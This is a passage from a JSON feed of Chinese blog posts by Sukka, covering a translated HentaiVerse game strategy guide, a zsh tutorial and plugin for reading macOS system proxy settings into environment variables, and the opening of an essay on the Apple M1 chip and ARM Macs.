turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 